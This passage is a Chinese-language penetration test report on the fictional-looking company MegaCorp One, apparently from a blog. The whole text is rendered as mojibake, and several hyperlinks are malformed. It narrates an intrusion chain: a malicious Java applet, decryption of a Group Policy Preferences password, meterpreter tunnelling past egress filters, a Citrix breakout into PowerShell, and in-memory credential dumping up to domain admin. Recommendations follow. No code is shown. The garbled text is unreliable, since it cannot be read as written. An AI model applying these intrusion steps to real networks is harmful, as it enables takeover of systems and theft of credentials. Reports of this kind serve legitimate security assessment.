äº†æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œæ‰€ä»¥è®©åˆ©ç”¨è¯¥æ¼æ´æœ‰ä¸€å®šçš„å¯è¡Œæ€§ã€‚å¦‚æœæ²¡æœ‰è¿™äº›å·¥å…·ï¼Œè¿˜æ˜¯ç”±å¯èƒ½æˆåŠŸææƒçš„ï¼Œå°½ç®¡è¿™ä¹ˆåšå·¥ä½œé‡ä¼šå¤§å¤§å¢åŠ ã€‚</p><p>æœåŠ¡å™¨æœ‰è®¸å¤šæ¼æ´ï¼Œå¯ä»¥ç»™æ”»å‡»è€…å¾ˆå¤šæœºä¼šï¼Œå¦‚æœä¸è¡¥æ•‘çš„è¯ã€‚æœ‰äº†ç®¡ç†å‘˜çš„æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åšå¾ˆå¤šçš„äº‹ï¼Œæ—¢å¯ä»¥æ”»å‡»MegaCorp Oneè‡ªå·±ï¼Œä¹Ÿå¯ä»¥æ”»å‡»å®ƒçš„ç”¨æˆ·ã€‚å½“ç„¶ï¼Œå¾ˆå¤§çš„å¯èƒ½æ˜¯åŒæ—¶åšè¿™ä¸¤ä»¶äº‹æƒ…ã€‚</p><h3 id="JAVAå®¢æˆ·æœºæ”»å‡»"><a href="#JAVAå®¢æˆ·æœºæ”»å‡»" class="headerlink" title="JAVAå®¢æˆ·æœºæ”»å‡»"></a>JAVAå®¢æˆ·æœºæ”»å‡»</h3><p>ç™»å½•ç®¡ç†å‘˜è´¦æˆ·ï¼Œåˆ†æè¯¥ç³»ç»Ÿã€‚æ‰¾åˆ°äº†ç½‘ç«™çš„ä¸€ä¸ªç§æœ‰éƒ¨åˆ†ï¼Œè¿™ä¸ªéƒ¨åˆ†ç»™ä¸€äº›ç‰¹æ®Šçš„å·¥ä½œç«™è¿è¡Œä¸€ä¸ªJavaå°ç¨‹åºã€‚è¿™ä¸ªæœ‰é—®é¢˜çš„ç½‘æ®µåæ¥è¢«å‘ç°æ˜¯MwgaCorp Oneçš„ç®¡ç†ç½‘æ®µã€‚</p><p>Figure 14-Htaccessè§„åˆ™æš´éœ²äº†è¯¥ç½‘ç»œçš„ä¸€ä¸ªå­ç½‘</p><p>é€šè¿‡æŸ¥çœ‹logæ–‡ä»¶å’ŒJavaå°ç¨‹åºçš„è¿è¡Œæ–¹å¼ï¼Œå‘ç°è¿™ä¸ªç¨‹åºç»™MegaCorp Oneå­ç½‘å†…éƒ¨ç”¨æˆ·æä¾›äº†ç®¡ç†å‘˜åŠŸèƒ½ã€‚è¿™å¯¹æ”»å‡»è€…æ¥è¯´éå¸¸æœ‰åˆ©ï¼Œå› ä¸ºå®ƒæä¾›äº†è¿›å…¥å†…ç½‘çš„å¯èƒ½æ–¹æ³•ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªç¨‹åºï¼Œè¿›å…¥å†…ç½‘ä¼šå¾ˆå›°éš¾ã€‚</p><p>è·å¾—äº†MegaCorp Oneçš„è®¸å¯åï¼Œæˆ‘ä»¬æ·»åŠ äº†ä¸€ä¸ªå¯è¢«å®¢æˆ·æœºä¸‹è½½çš„å°ç¨‹åºã€‚æ”»å‡»çš„åŸç†æ˜¯è®©å®¢æˆ·æœºä¿¡ä»»è¿™ä¸ªç¨‹åºï¼Œå…è®¸è¿è¡Œï¼Œå°±å¯ä»¥è¿æ¥åˆ°å…¶ä»–çš„å®¢æˆ·æœºã€‚è¿™æ˜¯æ™®é€šçš„ç¤¾ä¼šå·¥ç¨‹æ”»å‡»çš„è¡ç”Ÿå“ï¼Œæ‰€è°“ç¤¾ä¼šå·¥ç¨‹å­¦æ”»å‡»ï¼Œå°±æ˜¯è®©å—å®³è€…ä¸»åŠ¨å»è¿è¡Œä¸€ä¸ªæœ‰å®³çš„ç¨‹åºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä¸ç”¨å»è¯¯å¯¼å—å®³è€…ï¼Œå› ä¸ºè¿™ä¸ªç¨‹åºæ—©å·²è¢«è®¤ä¸ºæ˜¯å¯ä¿¡çš„ã€‚</p><p>æ­£å¦‚æ‰€æ–™ï¼Œå¯ä»¥è¿æ¥ä¸Šå…¶ä»–å®¢æˆ·æœºã€‚</p><p>Figure 15-åˆ©ç”¨æ¶æ„çš„javaå°ç¨‹åºï¼Œå¯ä»¥æ“çºµä¸»æœº</p><p>åœ¨é€‚å½“çš„åœ°æ–¹å®æ–½è¯¥æ–¹æ¡ˆï¼Œå¯ä»¥å¾—åˆ°ç®¡ç†å‘˜ç½‘ç»œçš„ç³»ç»Ÿæƒé™ï¼Œè§å›¾16ã€‚</p><p>Figure 16-Javaå°ç¨‹åºæˆåŠŸæ”»å‡»</p><h3 id="å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜"><a href="#å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜" class="headerlink" title="å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜"></a>å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜</h3><p>Javaå°ç¨‹åºçš„æ”»å‡»åªèƒ½æä¾›ä¸€èˆ¬ç”¨æˆ·çš„æƒé™ã€‚ä¸ºäº†èƒ½åšæ›´å¤šçš„äº‹ï¼Œéœ€è¦é€æ­¥æå‡æƒé™ï¼Œæˆä¸ºåŸŸç®¡ç†å‘˜ã€‚é¦–å…ˆï¼Œè¦è·å¾—æœ¬åœ°ç®¡ç†æƒé™ã€‚è¦è¾¾æˆè¿™ä¸€ç›®çš„ï¼Œå…ˆæ£€æŸ¥ç³»ç»Ÿçœ‹çœ‹æœ‰ä»€ä¹ˆæ¼æ´ã€‚</p><p>å‘ç°ä¸€ä¸ªç»„ç­–ç•¥é¦–é€‰é¡¹æ–‡ä»¶ï¼Œå…¶å…è®¸ç”¨æˆ·è§£å¯†æœ¬åœ°ç®¡ç†å‘˜å¯†ç ã€‚(<a href="http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚" target="_blank" rel="noopener">http://msdn.microsoft.com/en-us/library/cc422924.aspx,http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx)è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚</a></p><p>Figure 17-åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œå¯ä»¥è·å¾—åŸŸæ§åˆ¶å™¨çš„Groups.xmlæ–‡ä»¶</p><p>Figure 18-åœ¨Groups.xmlä¸­åŒ…å«åŠ å¯†çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç </p><p>Figure 19-ä½¿ç”¨Microsoftå‘å¸ƒçš„åŠ å¯†å¯†é’¥ï¼Œè¿™ä¸ªåŠ å¯†å¯†ç å¾ˆå®¹æ˜“è§£å¯†</p><p>ä½¿ç”¨è¿™ä¸ªæ˜æ–‡å¯†ç ï¼Œå¾—åˆ°å®¢æˆ·æœºçš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ã€‚</p><h3 id="æ·±åŒ…æ£€æµ‹è§„é¿"><a href="#æ·±åŒ…æ£€æµ‹è§„é¿" class="headerlink" title="æ·±åŒ…æ£€æµ‹è§„é¿"></a>æ·±åŒ…æ£€æµ‹è§„é¿</h3><p>å½“å°è¯•å»ºç«‹è¿›å…¥å—æŸç³»ç»Ÿçš„é™„åŠ å±‚æ—¶ï¼Œé‡åˆ°äº†è¿›æ”»æ€§å‡ºå£è¿‡æ»¤ã€‚è¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡ç¢°åˆ°ï¼Œå½“ä¸ºMicrosohtè¿œç¨‹æ¡Œé¢åè®®å»ºç«‹åŠ å¯†çš„å‡ºå£éš§é“ã€‚</p><p>Figure 20-åˆæ­¥å°è¯•å»ºç«‹RDPçš„å‡ºéš§é“è¢«å‡ºå£è¿‡æ»¤ç³»ç»Ÿé˜»æ­¢</p><p>å¦å¤–ï¼Œå½“å°è¯•è¿æ¥æ”»å‡»è€…çš„åœ¨80ç«¯å£ä¸Šçš„SSHæœåŠ¡å™¨æ—¶ï¼Œå‘ç°ç½‘ç»œåè®®å¼ºåˆ¶æ‰§è¡Œã€‚æˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªéš§é“æ¥é¿å¼€è¿‡æ»¤ï¼Œè¿™ä¸ªéš§é“æœ‰ä¸ªè¿è¡Œçš„meterpreterä¼šè¯ï¼Œå…è®¸è·å–æ”»å‡»è€…åˆ†äº«çš„æ–‡ä»¶ã€‚ç”¨è¿™ä¸ªä¼šè¯åœ¨å—æŸä¸»æœºä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜æƒé™è¿è¡Œwindows SHELLã€‚åœ¨è¿™ä¸ªshellé‡Œï¼Œæ‰§è¡Œä¸€æ®µé¢å¤–çš„meterpreterå…³é”®ä»£ç ã€‚</p><p>Figure 21-é€šè¿‡æœ€åˆçš„meterpreterä¼šè¯å»ºç«‹ç«¯å£è½¬å‘ï¼Œ å¯ä»¥ç›´æ¥è®¿é—®å—æŸä¸»æœº</p><p>Figure 22-ç”¨è¿™ä¸ªæ–°å»ºç«‹çš„è¿æ¥æ¥è·å¾—ä¸»æœºçš„shell</p><p>Figure 23-åœ¨10.7.0.22ä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜æƒé™å»ºç«‹ä¸€ä¸ªmeterpreter shell</p><p>æœ‰äº†è¿™ä¸ªmeterpreter shellï¼Œå°±å¯ä»¥åˆ©ç”¨HTTP-Tunnelï¼Œè¿™æ˜¯ä¸€ä¸ªå¼€æºç¨‹åºï¼Œï¼ˆ<a href="http://http-tunnel.sourceforge.net/ï¼‰å»å°è£…HTTPè´Ÿè½½å†…çš„ä»»æ„æµé‡ã€‚æ¯”å¦‚å°è£…æ”»å‡»è€…å’Œä¸»æœºçš„è¿œç¨‹æ¡Œé¢è¿æ¥æ•°æ®ã€‚è¿™ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„è®¿é—®æ–¹å¼ï¼Œè€Œä¸ä»…ä»…æ˜¯å‘½ä»¤è¡Œã€‚è¿œç¨‹æ¡Œé¢è¿æ¥æ˜¯ç”¨â€œmikeâ€œè¿™ä¸ªç”¨æˆ·çš„å¯†ç åˆ›å»ºçš„ï¼Œâ€mikeâ€œçš„å¯†ç å°±æ˜¯ä¹‹å‰ä»SQLite" target="_blank" rel="noopener">http://http-tunnel.sourceforge.net/ï¼‰å»å°è£…HTTPè´Ÿè½½å†…çš„ä»»æ„æµé‡ã€‚æ¯”å¦‚å°è£…æ”»å‡»è€…å’Œä¸»æœºçš„è¿œç¨‹æ¡Œé¢è¿æ¥æ•°æ®ã€‚è¿™ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„è®¿é—®æ–¹å¼ï¼Œè€Œä¸ä»…ä»…æ˜¯å‘½ä»¤è¡Œã€‚è¿œç¨‹æ¡Œé¢è¿æ¥æ˜¯ç”¨â€œmikeâ€œè¿™ä¸ªç”¨æˆ·çš„å¯†ç åˆ›å»ºçš„ï¼Œâ€mikeâ€œçš„å¯†ç å°±æ˜¯ä¹‹å‰ä»SQLite</a> Managerå‘ç°çš„ã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚</p><p>Figure 24-é€šè¿‡httpéš§é“å±è”½è¿‡æ»¤åè®®ï¼Œå»ºç«‹è¿œç¨‹æ¡Œé¢è¿æ¥</p><p>æ­¤æ—¶ï¼ŒMefaCorp Oneçš„ç½‘ç»œå·²è¢«å®Œå…¨æ”»é™·ï¼Œå¦‚å›¾25æ‰€ç¤ºã€‚æˆ‘ä»¬èƒ½å¤Ÿä»¥æ§åˆ¶å°çš„æƒé™è®¿é—®ä¸€å°Megacorp Oneä¿¡ä»»çš„ç”µè„‘ã€‚åªæ˜¯è®¿é—®å—é™ï¼Œå› ä¸ºæ˜¯é ä¸€ä¸ªæ— ç‰¹æƒçš„åŸŸç”¨æˆ·ï¼Œå’Œä¸€ä¸ªæœ¬åœ°ç®¡ç†å‘˜è´¦æˆ·ã€‚</p><p>Figure 25-åˆ°è¾¾ç®¡ç†å‘˜å­ç½‘</p><h3 id="Citrixç¯å¢ƒä¸‹çš„æ¼æ´"><a href="#Citrixç¯å¢ƒä¸‹çš„æ¼æ´" class="headerlink" title="Citrixç¯å¢ƒä¸‹çš„æ¼æ´"></a>Citrixç¯å¢ƒä¸‹çš„æ¼æ´</h3><p>æˆ‘ä»¬ç”¨è¿œç¨‹æ¡Œé¢è®¿é—®æ–¹å¼è¿›å…¥å†…éƒ¨ç½‘ç»œï¼Œç»§ç»­æ‰«æä»¥å‘ç°æœ‰ä»·å€¼çš„ç›®æ ‡ã€‚æ‰¾åˆ°äº†ä¸€ä¸ªCitrixçš„æœåŠ¡å™¨ï¼Œåœ¨å—æŸä¸»æœºä¸Šå®ƒè¢«è®¾ç½®æˆä¸»é¡µã€‚ä½¿ç”¨å’Œå»ºç«‹è¿œç¨‹æ¡Œé¢è¿æ¥ç›¸åŒçš„è¯ä¹¦ï¼ŒæˆåŠŸç™»å½•Citrixã€‚</p><p>Figure 26-å‘ç°ä¸€å°æ”¯æŒieçš„CitrixæœåŠ¡å™¨</p><p>æ­¤Citrixç¯å¢ƒè¯´æ˜â€œieâ€œæ˜¯å”¯ä¸€å¯ä½¿ç”¨çš„ç¨‹åºã€‚è¿™ç§åšæ³•è¢«å¾ˆå¤šç»„ç»‡é‡‡ç”¨æ¥é™åˆ¶è¿›å…¥CitrixæœåŠ¡å™¨åº•å±‚çš„æ“ä½œç³»ç»Ÿã€‚ä½†æ˜¯æœ‰å¾ˆå¤šçš„æ–¹æ³•å¯ä»¥ç»•è¿‡é™åˆ¶ã€‚è¿™é‡Œï¼Œæˆ‘ä»¬ç”¨â€Saveâ€œè¿™ä¸ªå¯¹è¯æ¡†ç”Ÿæˆä¸€ä¸ªæ‰¹å¤„ç†æ–‡ä»¶ï¼Œå…¶èƒ½è®©æˆ‘ä»¬ä½¿ç”¨Powershellã€‚</p><p>è¿™æ ·åšå¯èƒ½æˆåŠŸï¼Œå› ä¸ºâ€œSaveâ€å¯¹è¯æ¡†çš„æ“ä½œæ–¹å¼å¤§è‡´ç›¸åŒï¼Œéƒ½æ˜¯â€œWindows Explorerâ€çš„æ–‡ä»¶ç®¡ç†çª—å£ã€‚</p><p>Figure 27-ä½¿ç”¨Saveå¯¹è¯æ¡†æœ‰å¯èƒ½çªç ´Citrixç¯å¢ƒä¸‹çš„é™åˆ¶</p><p>Figure 28-åœ¨Citrixä¸Šåˆ›å»ºæœ‰Powershellç¨‹åºçš„æ‰¹å¤„ç†æ–‡ä»¶</p><p>Figure 29-æ‰§è¡ŒPwershellçªç ´Citrixçš„é™åˆ¶</p><p>Powershellä¹Ÿå¯ä»¥ç”¨æ¥ä¸‹è½½æ¶æ„çš„ä»£ç ï¼Œè¿™äº›ä»£ç åˆ›å»ºåº•å±‚æœåŠ¡å™¨çš„meterpreterä¼šè¯ã€‚</p><p>Figure 30-Powershellå…è®¸ç»ˆç«¯ç”¨æˆ·æ¥å—ä»»æ„æºçš„æ–‡ä»¶ï¼ŒåŒ…æ‹¬è¿œç¨‹ç½‘ç»œåœ°å€</p><p>åˆ©ç”¨Saveå¯¹è¯æ¡†è¿è¡Œä»»æ„å¯æ‰§è¡Œçš„ä»£ç ï¼Œå¯ä»¥å’Œä¹‹å‰çš„å‘ç°ç»“åˆåœ¨ä¸€èµ·ï¼Œä¹‹å‰å‘ç°äº†æœ¬åœ°è´¦æˆ·å¯†ç ï¼Œå¯ä»¥ä»¥ç®¡ç†å‘˜çš„æƒé™æ‰§è¡Œç¨‹åºã€‚è¿™å°±å–å¾—äº†è¿™ä¸ªç³»ç»Ÿçš„å®Œæ•´çš„ç®¡ç†å‘˜æ§åˆ¶æƒã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚</p><p>Figure 31-æ”»å‡»è€…åˆ©ç”¨ç®¡ç†å‘˜å¯†ç ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œæ¶æ„ä»£ç </p><p>Figure 32-å®ŒæˆCitrixæœåŠ¡å™¨çš„å®Œå…¨æ§åˆ¶</p><p>Figure 33-åœ¨ç®¡ç†å‘˜å†…ç½‘ä¸­æ·»åŠ äº†ä¸€å°ä¸»æœº</p><h3 id="å‡çº§ä¸ºåŸŸç®¡ç†å‘˜"><a href="#å‡çº§ä¸ºåŸŸç®¡ç†å‘˜" class="headerlink" title="å‡çº§ä¸ºåŸŸç®¡ç†å‘˜"></a>å‡çº§ä¸ºåŸŸç®¡ç†å‘˜</h3><p>æœ‰äº†è¿™å°å—æŸCitrixæœåŠ¡å™¨ï¼Œæˆ‘ä»¬è¯•ç€åœ¨å†…å­˜ä¸­æœç´¢å¯†ç ã€‚CitrixæœåŠ¡å™¨æ˜¯è¿™ç§æ”»å‡»äº†çš„ç†æƒ³çš„å€™é€‰ï¼Œå› ä¸ºå¯ä»¥æ“ä½œå¾ˆé•¿æ—¶é—´ï¼Œè€Œä¸ç”¨é‡å¯è¿˜æœ‰ä¸ºå¤§é‡ç”¨æˆ·æä¾›æœåŠ¡ã€‚</p><p>æˆ‘ä»¬ç”¨Windows Credential Editorè¿™ä¸ªå·¥å…·æ¥å¾—åˆ°å†…å­˜ä¸­çš„å¯†ç ï¼Œå› ä¸ºå®ƒå¯ä»¥è¿è¡Œåœ¨64ä½çš„ç³»ç»Ÿä¸Šä¸”ä¸ä¼šäº§ç”Ÿé”™è¯¯ã€‚</p><p>Figure 34-ç”¨Windows Credentials Editorå¾—åˆ°æœåŠ¡å™¨ä¸Šçš„æ˜æ–‡å¯†ç </p><p>è¿™ä¸ªå·¥å…·çˆ†å‡ºäº†å¾ˆå¤šçš„å¯†ç ï¼ŒåŒ…æ‹¬WindowsåŸŸç®¡ç†å‘˜çš„å¯†ç ã€‚è¯¦æƒ…è¯·çœ‹é™„å½•Aã€‚ä¸ºäº†ä½¿æ¢å¤å‡ºæ¥çš„å‡­è¯æœ‰æ•ˆï¼Œæˆ‘ä»¬ç”¨åŸŸç®¡ç†å‘˜æƒé™åˆ›å»ºæ–°çš„è¿œç¨‹æ¡Œé¢è¿æ¥ä¼šè¯ã€‚</p><p>Figure 35-åŸŸç®¡ç†å‘˜è¯ä¹¦æœ‰æ•ˆ<br>æ­¤æ—¶ï¼Œå¯ä»¥æ§åˆ¶æ•´ä¸ªWindowsåŸŸäº†ã€‚ä¸€ä¸ªæ¶æ„æ”»å‡»è€…æœ‰è®¸å¤šçš„å·¥å…·å¯ä»¥ç”¨ï¼ŒåŒ…æ‹¬ï¼š<br>ï‚²    åœ¨Windowsç³»ç»Ÿä¸Šåˆ©ç”¨ç»„ç­–ç•¥ä¸Šä¼ åé—¨ç¨‹åºã€‚<br>ï‚²    å¯¹ä»»ä½•ä½¿ç”¨Windowsèº«ä»½éªŒè¯çš„ç³»ç»Ÿä¸Šå­˜å‚¨çš„æ‰€æœ‰æ•°æ®è¿›è¡Œæ’é™¤ã€‚<br>ï‚²    é”€æ¯ä»»ä½•ä»¥åŠæ‰€æœ‰ç½‘ç»œèµ„æºã€‚<br>ï‚²    æœ‰ç›®çš„æ€§çš„æ”»å‡»MegaCorp Oneä»»ä¸€èŒå‘˜ï¼Œé€šè¿‡ä¿¡æ¯æ”¶é›†å·¥å…·ï¼Œä¾‹å¦‚å¯ä»¥è¾¨è®¤ä¸ªäººä¿¡æ¯çš„keystroke loggers<br>ï‚²    æ³„éœ²å¯¹MegaCorp Oneä¿¡ä»»çš„ä¼™ä¼´æˆ–æ”¯æŒç»„ç»‡çš„ç³»ç»Ÿè¿›å…¥æ–¹å¼ï¼Œä¾¿å¯ä»¥å±•å¼€æ”»å‡»</p><p>å¯ä»¥ç¡®å®šï¼Œè¿™äº›æ­¥éª¤æ˜¯å¯è¡Œçš„ï¼Œä¸”å¯ä»¥åœ¨å½“å‰ç¯å¢ƒä¹‹å¤–ä½¿ç”¨ã€‚å¾ˆæ˜æ˜¾ï¼Œå·²ç»æ”»é™·äº†æ•´ä¸ªMegaCorp OneåŸŸï¼Œæœ¬åœ°æ‰€æœ‰ç³»ç»Ÿå·²ç»å¤±å»äº†ä¸€ä½“æ€§ã€‚</p><p>Figure 36-æ”»é™·åŸŸ</p><h2 id="æ€»è®º"><a href="#æ€»è®º" class="headerlink" title="æ€»è®º"></a>æ€»è®º</h2><p>MegaCorp Oneæœ‰ä¸€ç³»åˆ—çš„é…ç½®é”™è¯¯ï¼Œè€Œä½¿å…³é”®å…¬å¸èµ„äº§æ³„éœ²ã€‚å¦‚æœä¸€ä¸ªæ¶æ„çš„ç»„ç»‡åˆ©ç”¨è¿™äº›é”™è¯¯ï¼Œä¼šäº§ç”Ÿæ¶åŠ£çš„å½±å“ã€‚ç°æœ‰çš„å…³äºå¯†ç é‡ç”¨ï¼Œä¸Šä¼ æ§åˆ¶çš„ç­–ç•¥è¿˜ä¸å®Œå–„ï¼Œä¸èƒ½æ¶ˆé™¤æ¼æ´å‘ç°äº§ç”Ÿçš„å½±å“ã€‚</p><p>è¿™æ¬¡æ¸—é€æµ‹è¯•çš„å…·ä½“ç›®æ ‡å¦‚ä¸‹ï¼š<br>ï‚²    ç¡®è®¤è¿œç¨‹æ”»å‡»è€…èƒ½å¦æ”»ç ´MegaCorp Oneçš„é˜²å¾¡ç³»ç»Ÿ<br>ï‚²    ç¡®å®šå®‰å…¨æ¼æ´çš„å½±å“ï¼š<br>ï®    ç»„ç»‡ä¿¡æ¯çš„æœºå¯†æ€§<br>ï®    MegaCorp Oneä¿¡æ¯ç³»ç»Ÿçš„å†…éƒ¨åŸºç¡€ç»“æ„å’Œå¯ç”¨æ€§</p><p>è¿™æ¬¡æ¸—é€æµ‹è¯•å®Œæˆäº†è¿™äº›ç›®æ ‡ã€‚ä¸€æ¬¡æ”»å‡»å°±å¯ä»¥è·å¾—æ‰€æœ‰çš„è”åˆèµ„äº§ã€‚è®¸å¤šè¢«è®¤ä¸ºæ˜¯å°äº‹çš„é—®é¢˜ä¼šè¢«ä¸€èµ·åˆ©ç”¨ï¼Œé€ æˆäº†ç³»ç»Ÿçš„æ²¦é™·ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ•´ä¸ªMegacorp Oneå®‰å…¨åŸºç¡€è®¾æ–½çš„å´©æºƒå¾ˆå¤§ç¨‹åº¦ä¸Šå½’å› äºå¯¹ç½‘ç»œè¾¹ç•Œå’Œä¸»æœºçº§åˆ«çš„è®¿é—®æ§åˆ¶ä¸è¶³ã€‚éœ€è¦å¼•è¿›æœ‰æ•ˆçš„ç½‘ç»œåˆ†å±‚ç³»ç»Ÿä»¥å‡è½»å› æ•´ä¸ªMegacorp OneåŸºç¡€è®¾æ–½çš„çº§è”å®‰å…¨æ•…éšœæ‰€äº§ç”Ÿçš„å½±å“ã€‚</p><h2 id="å»ºè®®"><a href="#å»ºè®®" class="headerlink" title="å»ºè®®"></a>å»ºè®®</h2><p>å› ä¸ºè¿™æ¬¡æ¸—é€æš´éœ²äº†æ•´ä¸ªç³»ç»Ÿæ¶æ„ï¼Œæ‰€ä»¥åˆé€‚çš„èµ„æºåˆ†é…å¯ä»¥ç¡®ä¿ä¿®è¡¥å·¥ä½œå¯åœ¨çŸ­æ—¶é—´å†…å®Œæˆã€‚è™½ç„¶éœ€è¦ä¿®å¤çš„æ¼æ´çš„å®Œæ•´è¡¨å•ä¸ä¼šæä¾›ï¼Œä½†ä¸€äº›é«˜å±æ¼æ´éœ€è¦è¯´æ˜ã€‚</p><p>å®‰å…¨å»ºè®®å¦‚ä¸‹ï¼š</p><ol><li>ç¡®ä¿ç»„ç»‡çš„ä»»ä½•åœ°æ–¹éƒ½ä½¿ç”¨äº†å¼ºå‡­è¯ã€‚åœ¨ç³»ç»Ÿçš„ä¸åŒå®‰å…¨å±‚çº§ä¸Šä½¿ç”¨å¼±å¯†ç å’Œç›¸åŒçš„å¯†ç ï¼Œä¼šä½¿æ”»å‡»æ›´åŠ å®¹æ˜“ã€‚å¯ä»¥å‚è€ƒNIST SP 800-11ï¼ˆ<a href="http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdfï¼‰æ¥åˆ¶å®šä¼ä¸šçš„å¯†ç æ¡æ¬¾ã€‚è™½ç„¶è¿™ä¸ªé—®é¢˜å­˜åœ¨ä¸å¹¿ï¼Œä½†ä»ç„¶æ˜¯ä¸ªé—®é¢˜ï¼Œéœ€è¦è§£å†³ã€‚" target="_blank" rel="noopener">http://csrc.nist.gov/publications/drafts/800-118/draft-sp800-118.pdfï¼‰æ¥åˆ¶å®šä¼ä¸šçš„å¯†ç æ¡æ¬¾ã€‚è™½ç„¶è¿™ä¸ªé—®é¢˜å­˜åœ¨ä¸å¹¿ï¼Œä½†ä»ç„¶æ˜¯ä¸ªé—®é¢˜ï¼Œéœ€è¦è§£å†³ã€‚</a></li><li>å»ºç«‹ä¿¡ä»»å¸¦ã€‚åœ¨å†…ç½‘ä¸­åˆé€‚çš„åœ°æ–¹å»ºç«‹ä¿¡ä»»é€»è¾‘è¾¹ç•Œã€‚æ¯ä¸ªé€»è¾‘ä¿¡ä»»éƒ¨åˆ†åº”ç›¸äº’è”åˆï¼Œä¸èƒ½è½»æ˜“ç ´åè€Œè¿ä¸Šå…¶ä»–éƒ¨åˆ†ã€‚æ‰€ä»¥è¦ä½¿ç”¨ä¸åŒçš„ç®¡ç†å‘˜è´¦å·ï¼Œè¿™æ ·æŸä¸€éƒ¨åˆ†å—æŸäº†ï¼Œä½†ä¸ä¼šå½±å“åˆ°å…¶ä»–éƒ¨åˆ†ã€‚</li><li>åœ¨æ‰€æœ‰ç³»ç»Ÿä¸­å®è¡Œå˜æ›´æ§åˆ¶ï¼šåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­éƒ½å‘ç°äº†é…ç½®é”™è¯¯å’Œä¸Šä¼ æ¼æ´ã€‚é€šè¿‡å˜æ›´æ§åˆ¶å¯å‡è½»è¿™äº›æ¼æ´å¸¦æ¥çš„é£é™©ã€‚</li><li>å®æ–½è¡¥ä¸ç®¡ç†ç¨‹åºï¼šæŒ‰ç…§NIST SP 800-40ï¼ˆ<a href="http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdfï¼‰æ¥åˆ›å»ºä¸€ä¸ªè¡¥ä¸ç®¡ç†ç¨‹åºï¼Œè¿™å¯¹å¯æŒç»­çš„å®‰å…¨ç¯å¢ƒæ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦ç»„ä»¶ã€‚è¿™å°†æœ‰åŠ©äºé™åˆ¶ç”±äºæœªä¿®è¡¥è€Œå¯¼è‡´çš„æ”»å‡»ã€‚" target="_blank" rel="noopener">http://csrc.nist.gov/publications/nistpubs/800-40-Ver2/SP800-40v2.pdfï¼‰æ¥åˆ›å»ºä¸€ä¸ªè¡¥ä¸ç®¡ç†ç¨‹åºï¼Œè¿™å¯¹å¯æŒç»­çš„å®‰å…¨ç¯å¢ƒæ¥è¯´æ˜¯ä¸€ä¸ªé‡è¦ç»„ä»¶ã€‚è¿™å°†æœ‰åŠ©äºé™åˆ¶ç”±äºæœªä¿®è¡¥è€Œå¯¼è‡´çš„æ”»å‡»ã€‚</a></li><li>æ–½è¡Œå¸¸è§„æ¼æ´è¯„ä¼°ã€‚ä½œä¸ºæœ‰æ•ˆç»„ç»‡é£é™©ç®¡ç†ç­–ç•¥çš„ä¸€éƒ¨åˆ†ï¼Œæ¼æ´è¯„ä¼°è¦åœ¨å¸¸è§„éƒ¨åˆ†æ‰§è¡Œã€‚è¿™æœ‰åŠ©äºç»„ç»‡ç¡®å®šå®‰å…¨æ§åˆ¶æ˜¯å¦æ­£ç¡®é…ç½®ï¼Œæ“ä½œæ˜¯å¦å¦‚é¢„æœŸèˆ¬æ‰§è¡Œï¼Œæ˜¯å¦ç”Ÿæˆäº†æƒ³è¦çš„ç»“æœã€‚å‚ç…§NIST SP 800-30ï¼ˆ<a href="http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201ï¼‰å»ºç«‹é«˜æ•ˆçš„é£é™©ç®¡ç†ç³»ç»Ÿã€‚" target="_blank" rel="noopener">http://csrc.nist.gov/publications/PubsDrafts.html#SP-800-30-Rev.%201ï¼‰å»ºç«‹é«˜æ•ˆçš„é£é™©ç®¡ç†ç³»ç»Ÿã€‚</a><h3 id="é£é™©ç­‰çº§"><a href="#é£é™©ç­‰çº§" class="headerlink" title="é£é™©ç­‰çº§"></a>é£é™©ç­‰çº§</h3>å¯¹MegaCorp Oneé£é™©è¯„å®šçš„ç»“æœä¸ºé«˜ã€‚å¤–éƒ¨æ”»å‡»è€…å¯ä»¥è·å¾—æ•´ä¸ªç³»ç»Ÿçš„æ§åˆ¶æƒã€‚æœ‰ç†ç”±ç›¸ä¿¡ä¸€ä¸ªæ¶æ„çš„ç»„ç»‡èƒ½å¤Ÿæ–½è¡Œæœ‰æ•ˆçš„ç›®æ ‡æ”»å‡»ã€‚</li></ol><p>â€ƒ</p><h2 id="é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³"><a href="#é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³" class="headerlink" title="é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³"></a>é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³</h2><h3 id="é£é™©ç­‰çº§èŒƒå›´"><a 